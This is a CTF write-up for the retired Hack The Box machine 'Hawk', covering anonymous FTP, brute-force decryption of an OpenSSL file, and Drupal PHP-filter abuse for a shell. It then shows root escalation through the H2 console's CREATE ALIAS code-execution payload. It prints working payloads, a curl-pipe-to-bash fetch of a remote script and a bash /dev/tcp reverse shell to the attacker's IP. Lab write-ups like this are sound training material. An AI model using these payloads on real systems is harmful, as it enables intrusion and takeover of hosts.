# Hawk

This is the write-up for the box Hawk that got retired at the 1st December 2018.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.102    hawk.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/hawk.nmap 10.10.10.102
```

```markdown
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    H2 database http console
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking FTP (Port 21)

As the Nmap scan shows, anonymous login on the FTP service is allowed:
```markdown
ftp 10.10.10.102
```

There is one directory _messages_ and in there is allegedly no file but with `dir -a` it also shows hidden files and there is _.drupal.txt.enc_.
The content is some encoded strings:
```markdown
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```
```markdown
cat drupal.txt.enc | base64 -d > drupal.txt.crypt
```

After _Base64-decoding_ it, it still is not human-readable text:
```markdown
Salted__kY ԓi-6l7Z>{$p5 2[
8?sWj#T$3AG,f   Z\ja>>G6
.EÐVV@ɗ4@wxZNiPtF`)
```

When running `file` against it, it gets recognized as _OpenSSL encrypted data with a salted password_:
```markdown
file drupal.txt.crypt

drupal.txt.crypt: openssl enc'd data with salted password
```

### Decrypting OpenSSL

The length of the encrypted text is 176 characters long which can be divided by 8 and thus it is probably a block cipher.
With `openssl help` in the bottom, it shows all ciphers that can be used.
Instead of trying every single one, lets make a list of common encryption ciphers and encrypt data until getting an output similar to our targets contents.

Contents of _ciphers.lst_:
```markdown
-aes-128-cbc
-aes-256-cbc
-aes-128-ecb
-aes-256-ecb
-aes-128-ofb
-aes-256-ofb
-des
```

Lets create files with different character lengths that can be divided by 8 until 176:
```bash
for i in $(seq 0 8 176); do python -c "print 'A'*$i" >  $i; done
```

Now encrypt every file with all the ciphers from the list:
```bash
for cipher in $(cat ciphers.lst); do
        for length in $(ls | grep ^[0-9]); do
           echo openssl enc $cipher -e -in $length -out $length$cipher.enc -k SomePassword
        done
done
```

The commands can now be copied and executed and it encrypts the files with every cipher and creates a file with the name for easier tracking.
Now counting which one of those files also has 176 characters:
```markdown
ls *.enc | xargs wc -c | grep '176 '
```
```markdown
176 144-aes-128-cbc.enc
176 144-aes-128-ecb.enc
176 144-aes-256-cbc.enc
176 144-aes-256-ecb.enc
176 152-aes-128-cbc.enc
176 152-aes-128-ecb.enc
176 152-aes-256-cbc.enc
176 152-aes-256-ecb.enc
176 152-des.enc
```

These are the candidates to compare to the original encoded file and try to crack it with all of those ciphers.
The tool **bruteforce-salted-openssl** will be used to crack the file:
```markdown
bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-128-cbc -d sha256 drupal.txt.crypt

bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 drupal.txt.crypt

(...)
```

With the cipher **AES-256-CBC**, it found a password:
> friends

Decrypting the file:
```markdown
openssl enc -aes-256-cbc -d -in drupal.txt.crypt -out drupal.txt.decrypt -k friends
```

It gets decrypted and the contents of the _drupal.txt_ are readable:
```markdown
Daniel,

Following the password for the portal:
PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,
IT department
```

There is a password for a portal and this portal is probably one of the HTTP services.

## Checking HTTP (Port 80)

On the web page on port 80 it shows a **Drupal** login page, which is a Content-Management-System.

![Drupal login page](https://kyuu-ji.github.io/htb-write-up/hawk/hawk_web-1.png)

The password found out earlier is working and with the username _admin_.

When looking at the _Modules_ there is a PHP module that allows PHP code to be executed. It can be activated by ticking it on _PHP Filter_.
After enabling it, uploading PHP files is possible.
```markdown
Content --> Add Content --> Article / Basic Page --> Text Format: PHP code
```

Lets upload a PHP reverse shell into it:

![Drupal upload PHP](https://kyuu-ji.github.io/htb-write-up/hawk/hawk_web-2.png)

After clicking on _Preview_ it hangs, but the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

To get any attack surface on the box, it is good to execute any **Linux Enumeration Script**.
```markdown
curl 10.10.14.6/LinEnum.sh | bash
```

In the list of processes runs _/usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar_ as root.
This is also the process found with Nmap that runs on port 8082, but when accessing it with a browser it says, that it does not allow remote connections:
```markdown
H2 Console

Sorry, remote connections ('webAllowOthers') are disabled on this server.
```

By creating an SSH tunnel on the box, we are able to access the **H2 console** locally:
```markdown
ssh -R 9002:127.0.0.1:8082 testuser@10.10.14.6
```

Now the service runs on my local client on port 9002:

![H2 Console](https://kyuu-ji.github.io/htb-write-up/hawk/hawk_h2-1.png)

### Exploiting H2 Console

When looking for exploits for **H2** there is an **Arbitrary Code Execution** vulnerability found:
```markdown
searchsploit h2
```
```markdown
H2 Database - 'Alias' Arbitrary Code Execution
H2 Database 1.4.196 - Remote Code Execution
H2 Database 1.4.197 - Information Disclosure
```

We don't have credentials, but when creating a new database, it redirects us to the console with user _sa_ and no password.
```markdown
(...)
JDBC URL: jdbc:h2:~/newdatabase
User Name: sa
Password:
```

![H2 Console](https://kyuu-ji.github.io/htb-write-up/hawk/hawk_h2-2.png)

The [article for the exploit](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) explains the vulnerability.
Running the command from the article:
```markdown
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
```

This executes the `id` command and shows that it was executed as root:

![H2 Console](https://kyuu-ji.github.io/htb-write-up/hawk/hawk_h2-3.png)

Code execution works, so creating a reverse shell script _(revshell.sh)_ on the box, making it executable with `chmod +x revshell.sh` and then executing it:
```markdown
bash -i >& /dev/tcp/10.10.14.6/9003 0>&1
```
```markdown
(...)SHELLEXEC('/tmp/revshell.sh')
```

After running the SQL query, the listener on my IP and port 9003 starts a reverse shell session as root!
